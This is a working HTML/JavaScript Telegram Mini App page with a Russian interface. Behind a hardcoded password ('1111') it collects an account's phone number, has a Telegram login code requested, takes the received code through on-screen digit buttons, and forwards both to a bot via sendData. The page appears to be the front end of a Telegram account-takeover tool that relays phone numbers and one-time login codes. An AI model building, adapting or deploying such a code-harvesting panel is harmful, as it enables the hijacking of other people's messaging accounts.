<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Вход по номеру и коду</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
      background: #0e1117;
      color: #e6edf3;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 14px;
    }
    .card {
      width: 100%;
      max-width: 430px;
      background: #161b22;
      border: 1px solid #30363d;
      border-radius: 14px;
      padding: 18px;
      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.45);
    }
    h1, h2 {
      margin: 0 0 8px;
      font-size: 19px;
    }
    .sub {
      margin: 0 0 14px;
      font-size: 13px;
      color: #8b949e;
      line-height: 1.4;
    }
    input {
      width: 100%;
      padding: 11px 12px;
      border-radius: 10px;
      border: 1px solid #30363d;
      background: #0d1117;
      color: #e6edf3;
      font-size: 15px;
      margin-bottom: 10px;
      outline: none;
    }
    input:focus {
      border-color: #2f81f7;
    }
    button {
      width: 100%;
      padding: 11px 12px;
      border: 0;
      border-radius: 10px;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      color: #fff;
      background: #238636;
    }
    button:active { transform: scale(0.99); }
    .btn-blue { background: #1f6feb; }
    .btn-gray { background: #30363d; }
    .btn-red { background: #da3633; }
    .err {
      color: #ff7b72;
      font-size: 13px;
      min-height: 18px;
      margin-bottom: 8px;
    }
    .panel { display: none; }
    .panel.active { display: block; }
    .top-bar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 12px;
      gap: 8px;
    }
    .badge {
      font-size: 11px;
      padding: 4px 8px;
      border-radius: 999px;
      background: #1f2937;
      color: #58a6ff;
      border: 1px solid #30363d;
      white-space: nowrap;
    }
    .step-box {
      background: #0d1117;
      border: 1px solid #21262d;
      border-radius: 12px;
      padding: 12px;
      margin-bottom: 12px;
    }
    .step-title {
      font-size: 12px;
      color: #8b949e;
      margin-bottom: 6px;
    }
    .code-display {
      background: #0d1117;
      border: 1px solid #30363d;
      border-radius: 12px;
      padding: 12px;
      text-align: center;
      font-size: 28px;
      font-weight: 700;
      letter-spacing: 6px;
      color: #79c0ff;
      min-height: 56px;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 10px;
      user-select: all;
    }
    .keypad {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 8px;
      margin-bottom: 10px;
    }
    .key-btn {
      background: #21262d;
      border: 1px solid #30363d;
      font-size: 18px;
      padding: 13px 0;
      border-radius: 10px;
    }
    .key-btn:hover { background: #2d333b; }
    .row {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 8px;
      margin-bottom: 8px;
    }
    .status {
      margin-top: 10px;
      background: #0d1117;
      border: 1px solid #21262d;
      border-radius: 10px;
      padding: 10px 12px;
      font-size: 12px;
      color: #8b949e;
      line-height: 1.4;
      word-break: break-word;
    }
  </style>
</head>
<body>
  <div class="card">
    <!-- ВХОД ПО ПАРОЛЮ -->
    <div id="loginPanel" class="panel active">
      <h1>Доступ к панели</h1>
      <p class="sub">Введите пароль, чтобы открыть отправку номера и ввод кода кнопками.</p>
      <input id="passInput" type="password" placeholder="Пароль (по умолчанию 1111)" autocomplete="off" />
      <div id="loginErr" class="err"></div>
      <button id="loginBtn" class="btn-blue">Войти</button>
    </div>

    <!-- ОСНОВНАЯ ПАНЕЛЬ -->
    <div id="mainPanel" class="panel">
      <div class="top-bar">
        <h2>Запрос и ввод кода</h2>
        <span class="badge" id="stepBadge">Шаг 1: Номер</span>
      </div>

      <!-- ШАГ 1: НОМЕР ТЕЛЕФОНА -->
      <div class="step-box">
        <div class="step-title">1. Введите номер аккаунта и отправьте запрос кода</div>
        <input id="phoneInput" type="tel" placeholder="+380..." autocomplete="tel" />
        <div class="row">
          <button id="sendPhoneBtn" class="btn-blue">Отправить номер</button>
          <button id="resendCodeBtn" class="btn-gray">Запросить код снова</button>
        </div>
      </div>

      <!-- ШАГ 2: ВВОД ПРИШЕДШЕГО КОДА КНОПКАМИ -->
      <div class="step-box">
        <div class="step-title">2. Введите полученный код кнопками ниже</div>
        <div id="codeDisplay" class="code-display">-----</div>

        <div class="keypad" id="keypad">
          <button type="button" class="key-btn" data-digit="1">1</button>
          <button type="button" class="key-btn" data-digit="2">2</button>
          <button type="button" class="key-btn" data-digit="3">3</button>
          <button type="button" class="key-btn" data-digit="4">4</button>
          <button type="button" class="key-btn" data-digit="5">5</button>
          <button type="button" class="key-btn" data-digit="6">6</button>
          <button type="button" class="key-btn" data-digit="7">7</button>
          <button type="button" class="key-btn" data-digit="8">8</button>
          <button type="button" class="key-btn" data-digit="9">9</button>
          <button type="button" class="key-btn btn-gray" id="clearCodeBtn">Сброс</button>
          <button type="button" class="key-btn" data-digit="0">0</button>
          <button type="button" class="key-btn btn-gray" id="delDigitBtn">⌫</button>
        </div>

        <div class="row">
          <button id="submitCodeBtn">Подтвердить код</button>
          <button id="logoutBtn" class="btn-red">Выйти</button>
        </div>
      </div>

      <div id="statusBox" class="status">Ожидание действий...</div>
    </div>
  </div>

  <script>
    const PASS = "1111";
    const MAX_CODE_LEN = 6;
    const tg = window.Telegram && window.Telegram.WebApp;

    if (tg) {
      tg.ready();
      tg.expand();
    }

    const loginPanel = document.getElementById("loginPanel");
    const mainPanel = document.getElementById("mainPanel");
    const passInput = document.getElementById("passInput");
    const loginErr = document.getElementById("loginErr");
    const phoneInput = document.getElementById("phoneInput");
    const codeDisplay = document.getElementById("codeDisplay");
    const stepBadge = document.getElementById("stepBadge");
    const statusBox = document.getElementById("statusBox");

    let enteredCode = "";

    function setStatus(text) {
      statusBox.textContent = text;
    }

    function updateCodeView() {
      codeDisplay.textContent = enteredCode.length > 0 ? enteredCode : "-----";
    }

    function sendPayload(data) {
      const jsonStr = JSON.stringify(data);
      if (tg && typeof tg.sendData === "function") {
        tg.sendData(jsonStr);
        setStatus("Отправлено в бота: " + jsonStr);
      } else {
        setStatus("Локально (вне Telegram WebApp): " + jsonStr);
      }
    }

    function checkLogin() {
      if (passInput.value.trim() === PASS) {
        loginPanel.classList.remove("active");
        mainPanel.classList.add("active");
        setStatus("Вход выполнен. Введите номер и нажмите «Отправить номер».");
      } else {
        loginErr.textContent = "Неверный пароль";
      }
    }

    document.getElementById("loginBtn").addEventListener("click", checkLogin);
    passInput.addEventListener("keydown", (e) => {
      if (e.key === "Enter") checkLogin();
    });

    document.getElementById("sendPhoneBtn").addEventListener("click", () => {
      const phone = phoneInput.value.trim();
      if (!phone) {
        setStatus("Сначала введите номер телефона.");
        return;
      }
      stepBadge.textContent = "Шаг 2: Код";
      sendPayload({ action: "send_phone", phone });
    });

    document.getElementById("resendCodeBtn").addEventListener("click", () => {
      const phone = phoneInput.value.trim();
      stepBadge.textContent = "Шаг 2: Код";
      sendPayload({ action: "resend_code", phone });
    });

    document.querySelectorAll(".key-btn[data-digit]").forEach((btn) => {
      btn.addEventListener("click", () => {
        if (enteredCode.length >= MAX_CODE_LEN) return;
        enteredCode += btn.dataset.digit;
        updateCodeView();
      });
    });

    document.getElementById("delDigitBtn").addEventListener("click", () => {
      enteredCode = enteredCode.slice(0, -1);
      updateCodeView();
    });

    document.getElementById("clearCodeBtn").addEventListener("click", () => {
      enteredCode = "";
      updateCodeView();
    });

    document.getElementById("submitCodeBtn").addEventListener("click", () => {
      const phone = phoneInput.value.trim();
      if (!enteredCode) {
        setStatus("Сначала введите код цифрами на кнопках.");
        return;
      }
      sendPayload({
        action: "submit_code",
        phone,
        code: enteredCode
      });
    });

    document.getElementById("logoutBtn").addEventListener("click", () => {
      enteredCode = "";
      updateCodeView();
      mainPanel.classList.remove("active");
      loginPanel.classList.add("active");
      passInput.value = "";
      loginErr.textContent = "";
    });
  </script>
</body>
  </html>
